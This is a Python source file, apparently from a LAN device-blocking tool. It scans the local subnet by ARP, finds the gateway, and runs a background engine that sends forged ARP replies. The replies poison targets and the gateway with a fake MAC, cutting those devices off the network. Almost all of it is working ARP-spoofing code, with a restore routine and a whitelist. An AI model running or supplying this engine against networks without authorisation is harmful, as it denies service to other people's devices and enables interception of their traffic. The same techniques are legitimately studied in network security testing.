"""Network layer: discovery, gateway detection and the ARP spoofing engine.

Requires scapy and elevated privileges (root / Administrator).
"""

from __future__ import annotations

import ipaddress
import socket
import threading
import time
from dataclasses import dataclass, field
from typing import Callable, Iterable

from .utils import IS_WINDOWS, normalize_mac
from .whitelist import Whitelist


@dataclass
class Device:
    ip: str
    mac: str
    hostname: str = ""
    vendor: str = ""

    @property
    def key(self) -> str:
        return normalize_mac(self.mac)


def _lazy_scapy():
    """Import scapy lazily so `--help` works without it installed."""
    try:
        from scapy.all import ARP, Ether, conf, srp  # noqa: F401
        from scapy.all import get_if_hwaddr  # noqa: F401
        return True
    except ImportError as exc:  # pragma: no cover - environment dependent
        raise RuntimeError(
            "scapy is not installed. Install it with: pip install scapy"
        ) from exc


def _local_iface() -> tuple[str, str]:
    """Return (iface_name, own_mac) for the default route interface."""
    _lazy_scapy()
    from scapy.all import conf, get_if_hwaddr

    iface = conf.iface
    name = getattr(iface, "name", str(iface))
    return name, get_if_hwaddr(iface)


def _iface_network(iface_name: str) -> ipaddress.IPv4Network:
    """Best-effort subnet of the given interface."""
    from scapy.all import conf

    try:
        iface = conf.ifaces.dev_from_name(iface_name)
        addr = iface.ip
        netmask = iface.netmask
        return ipaddress.IPv4Network(f"{addr}/{netmask}", strict=False)
    except Exception:
        # fallback: derive from a connected UDP socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            addr = s.getsockname()[0]
        finally:
            s.close()
        return ipaddress.IPv4Network(f"{addr}/24", strict=False)


def get_gateway(iface_name: str | None = None) -> tuple[str, str]:
    """Return (gateway_ip, gateway_mac)."""
    _lazy_scapy()
    from scapy.all import ARP, Ether, conf, srp

    if iface_name is None:
        iface_name, _ = _local_iface()

    gw_ip = None
    try:
        iface = conf.ifaces.dev_from_name(iface_name)
        gw_ip = getattr(iface, "router", None) or getattr(iface, "gw", None)
    except Exception:
        gw_ip = None

    if not gw_ip:
        # parse the routing table
        try:
            import subprocess

            if IS_WINDOWS:
                out = subprocess.check_output(["route", "print"], text=True)
                for line in out.splitlines():
                    if "Default" in line or "0.0.0.0" in line:
                        parts = line.split()
                        if len(parts) >= 3 and parts[2] != "0.0.0.0":
                            gw_ip = parts[2]
                            break
            else:
                out = subprocess.check_output(
                    ["ip", "route", "show", "default"], text=True
                )
                for line in out.splitlines():
                    if "via" in line:
                        gw_ip = line.split("via")[1].split()[0]
                        break
        except Exception:
            pass

    if not gw_ip:
        raise RuntimeError("Could not detect the default gateway.")

    # resolve gateway MAC via ARP
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gw_ip),
        timeout=3,
        iface=iface_name,
        verbose=0,
    )
    gw_mac = None
    for _, rcv in ans:
        gw_mac = normalize_mac(rcv.hwsrc)
        break
    if not gw_mac:
        raise RuntimeError(f"Gateway {gw_ip} did not answer ARP.")
    return gw_ip, gw_mac


def scan_devices(
    iface_name: str | None = None,
    timeout: float = 3.0,
    resolve_names: bool = True,
) -> list[Device]:
    """ARP-scan the local subnet and return live devices."""
    _lazy_scapy()
    from scapy.all import ARP, Ether, srp

    if iface_name is None:
        iface_name, _ = _local_iface()

    net = _iface_network(iface_name)
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(net)),
        timeout=timeout,
        iface=iface_name,
        verbose=0,
    )
    devices: dict[str, Device] = {}
    for _, rcv in ans:
        dev = Device(ip=rcv.psrc, mac=normalize_mac(rcv.hwsrc))
        devices[dev.ip] = dev

    if resolve_names:
        for dev in devices.values():
            try:
                socket.setdefaulttimeout(0.5)
                dev.hostname = socket.gethostbyaddr(dev.ip)[0]
            except Exception:
                dev.hostname = ""
    return sorted(devices.values(), key=lambda d: ipaddress.ip_address(d.ip))


@dataclass
class BlockEngine:
    """Runs ARP poisoning in a background thread for the blocked set."""

    gateway_ip: str
    gateway_mac: str
    iface_name: str
    whitelist: Whitelist
    # MAC announced to victims in place of the gateway. Defaults to our own MAC.
    poison_mac: str = "02:00:00:00:00:01"
    interval: float = 1.0
    on_event: Callable[[str], None] | None = None

    _targets: dict[str, str] = field(default_factory=dict)  # ip -> real mac
    _stop: threading.Event = field(default_factory=threading.Event)
    _thread: threading.Thread | None = None

    # -- public API --------------------------------------------------------
    def block(self, ip: str, mac: str) -> None:
        if self.is_whitelisted(mac):
            self._log(f"refusing to block whitelisted {ip} ({mac})")
            return
        if self.is_protected(mac):
            self._log(f"refusing to block protected/self {ip} ({mac})")
            return
        self._targets[ip] = normalize_mac(mac)
        self._ensure_running()
        self._log(f"blocking {ip} ({mac})")

    def unblock(self, ip: str) -> None:
        mac = self._targets.pop(ip, None)
        if mac:
            self._restore(ip, mac)
            self._log(f"restored {ip} ({mac})")
        if not self._targets:
            self._log("no targets left; engine idle")

    def unblock_all(self) -> None:
        for ip, mac in list(self._targets.items()):
            self._targets.pop(ip, None)
            self._restore(ip, mac)
        self._log("restored all devices")

    def start(self) -> None:
        self._ensure_running()

    def stop(self) -> None:
        self._stop.set()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=2)
        self.unblock_all()

    def is_whitelisted(self, mac: str) -> bool:
        return self.whitelist.is_whitelisted(mac)

    def is_protected(self, mac: str) -> bool:
        try:
            _, own = _local_iface()
        except Exception:
            return False
        return normalize_mac(mac) == normalize_mac(own)

    def blocked(self) -> dict[str, str]:
        return dict(self._targets)

    # -- internals ---------------------------------------------------------
    def _ensure_running(self) -> None:
        if self._thread and self._thread.is_alive():
            return
        self._stop.clear()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def _loop(self) -> None:
        _lazy_scapy()
        from scapy.all import ARP, send

        while not self._stop.is_set():
            for ip, mac in list(self._targets.items()):
                if self.whitelist.is_whitelisted(mac):
                    continue
                try:
                    # victim -> gateway misrouted through poison_mac
                    send(
                        ARP(
                            op=2,
                            pdst=ip,
                            hwdst=mac,
                            psrc=self.gateway_ip,
                            hwsrc=self.poison_mac,
                        ),
                        verbose=0,
                        iface=self.iface_name,
                    )
                    # gateway -> victim misrouted through poison_mac
                    send(
                        ARP(
                            op=2,
                            pdst=self.gateway_ip,
                            hwdst=self.gateway_mac,
                            psrc=ip,
                            hwsrc=self.poison_mac,
                        ),
                        verbose=0,
                        iface=self.iface_name,
                    )
                except Exception as exc:  # keep the loop alive
                    self._log(f"error spoofing {ip}: {exc}")
            self._stop.wait(self.interval)

    def _restore(self, ip: str, mac: str) -> None:
        _lazy_scapy()
        from scapy.all import ARP, send

        try:
            for _ in range(3):
                send(
                    ARP(
                        op=2,
                        pdst=ip,
                        hwdst=mac,
                        psrc=self.gateway_ip,
                        hwsrc=self.gateway_mac,
                    ),
                    verbose=0,
                    iface=self.iface_name,
                )
                send(
                    ARP(
                        op=2,
                        pdst=self.gateway_ip,
                        hwdst=self.gateway_mac,
                        psrc=ip,
                        hwsrc=mac,
                    ),
                    verbose=0,
                    iface=self.iface_name,
                )
                time.sleep(0.3)
        except Exception as exc:
            self._log(f"restore failed for {ip}: {exc}")

    def _log(self, msg: str) -> None:
        if self.on_event:
            self.on_event(msg)
